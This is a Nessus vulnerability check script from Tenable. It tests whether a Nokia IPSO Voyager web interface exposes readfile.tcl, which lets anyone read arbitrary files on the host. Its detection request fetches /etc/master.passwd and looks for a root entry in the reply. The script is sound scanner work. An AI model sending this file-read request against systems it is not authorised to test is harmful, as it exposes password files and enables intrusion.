#
# (C) Tenable Network Security, Inc.
#

# Ref:
# From: Jonas Eriksson [mailto:je@sekure.net]
# Date: 23/04/2003
# To: bugtraq@securityfocus.com
# Subject: Asunto: Nokia IPSO Vulnerability
#
# This vuln check only works if the user entered a username and password
# in the relevant field in the 'prefs' tab of nessus

include( 'compat.inc' );

if(description)
{
  script_id(11549);
  script_version("$Revision: 1.7 $");
  script_xref(name:"OSVDB", value:"53995");

  script_name(english:"Nokia IPSO Voyager WebGUI readfile.tcl file Parameter Arbitrary File Access");
  script_summary(english:"checks for readfile.tcl");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote host is vulnerable to inforamtion disclosure.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote host includes a CGI (/cgi-bin/readfile.tcl) which allows anyone
to read arbitrary files on the remote host with the privileges of the HTTP
daemon (typically 'nobody')."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Contact the vendor for the latest version of this software."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/2003-04/0288.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N'
  );

  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencie("find_service1.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

req = http_get(item:"/cgi-bin/readfile.tcl?file=/etc/master.passwd", port:port);
r = http_keepalive_send_recv(port:port, data:req);
if ( r == NULL ) exit(0);

if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
{
   	security_warning(port:port);
}
